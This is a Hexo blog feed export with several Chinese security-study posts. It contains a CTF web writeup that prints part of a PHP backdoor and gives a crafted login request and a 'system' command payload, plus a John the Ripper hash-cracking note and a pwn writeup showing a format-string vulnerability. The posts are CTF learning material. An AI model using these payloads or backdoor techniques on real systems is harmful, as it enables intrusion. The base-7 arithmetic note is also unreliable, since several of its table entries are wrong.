&#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，发觉可以命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure><p>部署在服务器上，默认以80端口，这样就不用index.php了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f605762/">https://noone-hub.github.io/posts/f605762/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>re学习第一天</title>
    <url>/posts/209dab3e/</url>
    <content><![CDATA[<h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><ol><li>进制的实质就是查表</li><li>熟悉2进制跟16进制的转换</li><li>熟悉进制表的制作以及计算进制之间的加减乘除</li></ol><h1 id="进制练习1"><a href="#进制练习1" class="headerlink" title="进制练习1"></a>进制练习1</h1><p>通过编写7进制加法表，乘法表，并计算<br>23456+54356 = ？<br>5621 - 654 = ？<br>234 * 65 = ？</p><h2 id="首先编写1-100的7进制数据"><a href="#首先编写1-100的7进制数据" class="headerlink" title="首先编写1-100的7进制数据"></a>首先编写1-100的7进制数据</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th><th>七</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr><tr><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td></tr><tr><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td></tr><tr><td>30</td><td>31</td><td>32</td><td>33</td><td>34</td><td>35</td><td>36</td></tr><tr><td>40</td><td>41</td><td>42</td><td>43</td><td>44</td><td>45</td><td>46</td></tr><tr><td>50</td><td>51</td><td>52</td><td>53</td><td>54</td><td>55</td><td>56</td></tr><tr><td>60</td><td>61</td><td>62</td><td>63</td><td>64</td><td>65</td><td>66</td></tr></tbody></table><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="编写7进制加法表"><a href="#编写7进制加法表" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>1+1=2</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1+2=3</td><td>2+2=4</td><td></td><td></td><td></td><td></td></tr><tr><td>1+3=4</td><td>2+3=5</td><td>3+3=6</td><td></td><td></td><td></td></tr><tr><td>1+4=5</td><td>2+4=6</td><td>3+4=10</td><td>4+4=11</td><td></td><td></td></tr><tr><td>1+5=6</td><td>2+5=10</td><td>3+5=11</td><td>4+5=12</td><td>5+5=13</td><td></td></tr><tr><td>1+6=7</td><td>2+6=11</td><td>3+6=12</td><td>4+6=13</td><td>5+6=14</td><td>6+6=15</td></tr></tbody></table><h2 id="编写7进制乘法表"><a href="#编写7进制乘法表" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>1*1=1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1*2=2</td><td>2*2=4</td><td></td><td></td><td></td><td></td></tr><tr><td>1*3=3</td><td>2*3=6</td><td>3*3=12</td><td></td><td></td><td></td></tr><tr><td>1*4=4</td><td>2*4=11</td><td>3*4=14</td><td>4*4=22</td><td></td><td></td></tr><tr><td>1*5=5</td><td>2*5=13</td><td>3*5=21</td><td>4*5=26</td><td>5*5=34</td><td></td></tr><tr><td>1*6=6</td><td>2*6=15</td><td>3*6=24</td><td>4*6=33</td><td>5*6=42</td><td>6*6=51</td></tr></tbody></table><h2 id="计算结果"><a href="#计算结果" class="headerlink" title="计算结果"></a>计算结果</h2><p>$23456 + 54356 = ?$<br>计算过程：</p><ol><li>6+6 查表是15，进一位，留5</li><li>5+5 查表是13， 13 + 1,3+1查表为4，为14，进一位，留4</li><li>4+3 查表是10， 10 + 1,11，进一位，留1</li><li>3+4 查表是10， 10+1 = 11，进一位，留1</li><li>2+5 查表是10， 10+1 = 11，进一位，留1<br>结果为：111145</li></ol><p>$5621 - 654 = ?$<br>计算过程：</p><ol><li>1不够减，借一位，为11,11-4=？，查表可得为4，</li><li>2-1 = 1,1-5不够，借一位，11-5=3</li><li>5-6不够，15-6=6</li><li>4<br>结果为：4634</li></ol><p>$234 * 65 = ?$<br>计算过程：</p><ol><li>4*5 = 26，留6 进2</li><li>3*5 = 21， 21+2， 23，留3 进2</li><li>2*5 = 13 13+2=15 留5，进1</li><li>1536</li><li>4*6 = 33, 留3 进3</li><li>3*6 = 24， 24+3,4+3 == 10,留0，进3</li><li>2*6 = 15， 15+3， 5+3=11，进2，留1</li><li>2103<br>结果为：22536</li></ol><h1 id="2-3-1？可能嘛"><a href="#2-3-1？可能嘛" class="headerlink" title="2+3 = 1？可能嘛"></a>2+3 = 1？可能嘛</h1><p>可能，当定义如下的10进制时便可，0,2,3,1,5,6,7,8,9,4</p><h1 id="16进制与二进制的映射"><a href="#16进制与二进制的映射" class="headerlink" title="16进制与二进制的映射"></a>16进制与二进制的映射</h1><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0001</td><td>0010</td><td>0011</td><td>0100</td><td>0101</td><td>0110</td><td>0111</td><td>1000</td><td>1001</td><td>1010</td><td>1011</td><td>1100</td><td>1101</td><td>1110</td><td>1111</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="自行编写进制加密"><a href="#自行编写进制加密" class="headerlink" title="自行编写进制加密"></a>自行编写进制加密</h1><p>定义如下的7进制，7，5,6,1,2,3,0<br>试着计算上题中的计算题目</p><h2 id="先编写进制对应"><a href="#先编写进制对应" class="headerlink" title="先编写进制对应"></a>先编写进制对应</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th><th>七</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td><td>1</td><td>2</td><td>3</td><td>0</td></tr><tr><td>54</td><td>55</td><td>56</td><td>51</td><td>52</td><td>53</td><td>50</td></tr><tr><td>64</td><td>65</td><td>66</td><td>61</td><td>62</td><td>63</td><td>60</td></tr><tr><td>14</td><td>15</td><td>16</td><td>11</td><td>12</td><td>13</td><td>10</td></tr><tr><td>24</td><td>25</td><td>26</td><td>21</td><td>22</td><td>23</td><td>20</td></tr><tr><td>34</td><td>35</td><td>36</td><td>31</td><td>32</td><td>33</td><td>30</td></tr><tr><td>04</td><td>05</td><td>06</td><td>01</td><td>02</td><td>03</td><td>00</td></tr></tbody></table><h2 id="编写7进制加法表-1"><a href="#编写7进制加法表-1" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>5+5=6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>5+6=1</td><td>6+6=2</td><td></td><td></td><td></td><td></td></tr><tr><td>5+1=2</td><td>6+1=3</td><td>1+1=0</td><td></td><td></td><td></td></tr><tr><td>5+2=3</td><td>6+2=0</td><td>1+2=54</td><td>2+2=55</td><td></td><td></td></tr><tr><td>5+3=0</td><td>6+3=54</td><td>1+3=55</td><td>2+3=56</td><td>3+3=51</td><td></td></tr><tr><td>5+0=54</td><td>6+0=55</td><td>1+0=56</td><td>2+0=51</td><td>3+0=52</td><td>0+0=53</td></tr></tbody></table><h2 id="编写7进制乘法表-1"><a href="#编写7进制乘法表-1" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>5*5=5</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>5*6=6</td><td>6*6=2</td><td></td><td></td><td></td><td></td></tr><tr><td>5*1=1</td><td>6*1=0</td><td>1*1=56</td><td></td><td></td><td></td></tr><tr><td>5*2=2</td><td>6*2=55</td><td>1*2=53</td><td>2*2=66</td><td></td><td></td></tr><tr><td>5*3=3</td><td>6*3=51</td><td>1*3=65</td><td>2*3=60</td><td>3*3=12</td><td></td></tr><tr><td>5*0=0</td><td>6*0=53</td><td>1*0=62</td><td>2*0=11</td><td>3*0=26</td><td>0*0=35</td></tr></tbody></table><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p>$23456+54356=？$<br>计算过程：</p><ol><li>6+6 = 2 留2</li><li>5+5 = 6 留6</li><li>4+3 = 3 留3</li><li>3+4 = 3 留3</li><li>2+5 = 3 留3<br>结果：33362</li></ol><p>$5621-654=？$<br>计算过程：</p><ol><li>1-4 = 1</li><li>2-5 = 1</li><li>6-6 = 0</li><li>5<br>结果：5011</li></ol><p>$234*65=?$<br>计算过程：</p><ol><li>4*5 = 4</li><li>3*5 = 3</li><li>2*5 = 2</li><li>234</li><li>4*6 = 4</li><li>3*6 = 51 留1 进5</li><li>2*6 = 55 55 + 5 ， 5+5=6， 55+5=56，留6，进5</li><li>5614<br>结果：51434</li></ol><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="push-后，esp改动的一定是按机器字长来的吗？"><a href="#push-后，esp改动的一定是按机器字长来的吗？" class="headerlink" title="push 后，esp改动的一定是按机器字长来的吗？"></a>push 后，esp改动的一定是按机器字长来的吗？</h2><p>不一定，可以push 16位的二进制数，esp-2,不可以弄8进制的数<br>32位：</p><ul><li>push dword ptr ds:[0x1234] esp = esp - 4</li><li>push eax</li><li>push ax</li><li>push al X</li><li>push word ptr ds:[0x1234] esp = esp - 2</li></ul><ul><li>pop ax esp = esp + 2</li><li>pop eax</li></ul><p>pushad popad</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><ol><li>进位标志CF（carry flag) 最高位产生进位或者借位，</li><li>奇偶标志位PF(Parity flag) 结果中1的个数，偶数PF=1,奇数PF=0</li><li>辅助进位标志AF(Auxiliary Carry flag)</li><li>零标志位ZF(zero flag) 用来反映结果是否是0</li><li>符号标志位SF（signed flag) 运算结果的符号位</li><li>溢出标志位OF(overflow flag)</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/209dab3e/">https://noone-hub.github.io/posts/209dab3e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>2019软件测试web安全题目writeup收集</title>
    <url>/posts/40674c1b/</url>
    <content><![CDATA[<h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>比比手速 靶机地址：101.71.29.5:10065</p><p>burp抓包可知密码<br>然后文件上传，1.php.jpg<br>连接小马</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnplZGR5dS5pbmZvLzIwMTkvMDIvMjQvJUU1JUFFJTg5JUU2JTgxJTkyMSVFNiU5QyU4OCVFNiU5QyU4OCVFOCVCNSU5Qi8=" title="https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/">https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/<i class="fa fa-external-link"></i></span></p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTYvYXJ0aWNsZS9kZXRhaWxzLzgzODY3OTc2" title="https://blog.csdn.net/u011377996/article/details/83867976">https://blog.csdn.net/u011377996/article/details/83867976<i class="fa fa-external-link"></i></span></p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p><span class="exturl" data-url="aHR0cHM6Ly9zc3llYXRzLmdpdGh1Yi5pby8yMDE4LzA5LzAxLyVFNSVBRSU4OSVFNiU4MSU5MjclRTYlOUMlODglRTglQjUlOUIlRTklODMlQTglRTUlODglODYlRTklQTIlOTh3cml0ZXVwLw==" title="https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/">https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/<i class="fa fa-external-link"></i></span><br>666_0rdorby_you_can</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p><span class="exturl" data-url="aHR0cHM6Ly9yb3l0c2UuZ2l0aHViLmlvLzIwMTcvMDcvMDMvQ1RGX1dyaXRlVXAvI2Vhc3ktbG9naW4=" title="https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login">https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3NpdGUzLnNqay5zcGFjZS9kb3NnazEucGhw" title="http://site3.sjk.space/dosgk1.php">http://site3.sjk.space/dosgk1.php<i class="fa fa-external-link"></i></span></p><p>a327f27394c63ef5d6b1eed9591b90a4</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>抓包可得</p><p>c456aa77cf2bc89affb665194e9dee57</p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p><span class="exturl" data-url="aHR0cHM6Ly9za3lzZWMudG9wLzIwMTgvMDkvMjQvMjAxOCVFNSVBRSU4OSVFNiU4MSU5MiVFNiU5RCVBRi05JUU2JTlDJTg4JUU2JTlDJTg4JUU4JUI1JTlCV3JpdGV1cC8jV2ViMg==" title="https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2">https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2<i class="fa fa-external-link"></i></span><br>aa5237a5fc25af3fa07f1d724f7548d7</p><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p><span class="exturl" data-url="aHR0cDovL2ZsYWcwLmNvbS8yMDE5LzA5LzI3LzIwMTklRTUlQUUlODklRTYlODElOTIlRTYlOUQlQUZXZWIlRTUlQUUlODklRTUlODUlQTglRTYlQjUlOEIlRTglQUYlOTUlRTUlQTQlQTclRTglQjUlOUIlRTclQkIlODMlRTQlQjklQTAlRTglQjUlOUJXcml0ZXVwLw==" title="http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/<i class="fa fa-external-link"></i></span></p><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p><span class="exturl" data-url="aHR0cDovL3hjeDEwMjQuY29tL0FydEluZm8vNTI0MDM5Lmh0bWw=" title="http://xcx1024.com/ArtInfo/524039.html">http://xcx1024.com/ArtInfo/524039.html<i class="fa fa-external-link"></i></span></p><p>981369acba32abc4e28103fedd4891d2</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/40674c1b/">https://noone-hub.github.io/posts/40674c1b/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习</title>
    <url>/posts/b14814c4/</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>john –format=raw-MD5 1.txt<br>破解hash值</p><p>二次执行<br>删除 ~/.john</p><p>john –format=raw-MD5 1.txt –show 可以展示以前破解的密码</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b14814c4/">https://noone-hub.github.io/posts/b14814c4/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web安全,sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署踩坑</title>
    <url>/posts/4169889/</url>
    <content><![CDATA[<h1 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>daovoice缓速会导致博客打开白页</p><h2 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h2><p>安装必要组件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xclip</span><br></pre></td></tr></table></figure><p>vscode装插件picgo,markdown_preview</p><p>用github做图床，自己创建项目<br>填写picgo配置里的</p><ol><li>Picgo › Pic Bed › Github: Branch</li><li>Picgo › Pic Bed › Github: Repo</li><li>Picgo › Pic Bed › Github: Token</li></ol><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>branch通常填master<br>repo复制过来就好<br>token在github-&gt;setting-&gt;developer settings 选择generate new token</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/20191030230028.png" alt="20191030230028.png"></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/4169889/">https://noone-hub.github.io/posts/4169889/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>linux,hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>360杯pwn部分题解</title>
    <url>/posts/3dac6f4c/</url>
    <content><![CDATA[<h1 id="360杯pwn题解"><a href="#360杯pwn题解" class="headerlink" title="360杯pwn题解"></a>360杯pwn题解</h1><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/20191030225324.png" alt="20191030225324.png"></p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串的题目，不过不是常规的栈格式化字符串，放到了bss段里的格式化字符串，当初做的时候不知道，以为常规。。。剩半个钟的时候发觉了，然后也没做了，后面复盘把他做了，发觉也不是那么一蹴而就的，有点意思</p><p>还有个点我不清楚。当时远程泄露libc我是查不到的，所以这个我不知道该如何解决？希望各位大佬能指点一二</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to 360CTF_2019"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Input"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Exit"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"It's time to input something"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buff, <span class="number">0x10</span>u);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buff);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good luck to you!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点很明显就是格式化字符串，N数值为3，所以目前来说只有三次机会，注意buff是在bss段的</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>格式化字符串第一步当然是泄露信息啊</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 25</span><br><span class="line">0000| 0xffb1738c (<span class="string">"!XUV\020pUV\020pUV\020"</span>)</span><br><span class="line">0004| 0xffb17390 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0008| 0xffb17394 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0012| 0xffb17398 --&gt; 0x10 </span><br><span class="line">0016| 0xffb1739c (<span class="string">"7WUV\374s\360\367\270oUVtt\261\377\001"</span>)</span><br><span class="line">0020| 0xffb173a0 --&gt; 0xf7f073fc --&gt; 0xf7f08980 --&gt; 0x0 </span><br><span class="line">0024| 0xffb173a4 --&gt; 0x56556fb8 --&gt; 0x1ed8 </span><br><span class="line">0028| 0xffb173a8 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0032| 0xffb173ac --&gt; 0x1 </span><br><span class="line">0036| 0xffb173b0 --&gt; 0x1 </span><br><span class="line">0040| 0xffb173b4 --&gt; 0x0 </span><br><span class="line">0044| 0xffb173b8 --&gt; 0xffb10a31 --&gt; 0x0 </span><br><span class="line">0048| 0xffb173bc --&gt; 0x84188400 </span><br><span class="line">0052| 0xffb173c0 --&gt; 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0056| 0xffb173c4 --&gt; 0x0 </span><br><span class="line">0060| 0xffb173c8 --&gt; 0x0 </span><br><span class="line">0064| 0xffb173cc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0068| 0xffb173d0 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0072| 0xffb173d4 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0076| 0xffb173d8 --&gt; 0x0 </span><br><span class="line">0080| 0xffb173dc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0084| 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0088| 0xffb173e4 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0092| 0xffb173e8 --&gt; 0xffb1747c --&gt; 0xffb183dd (<span 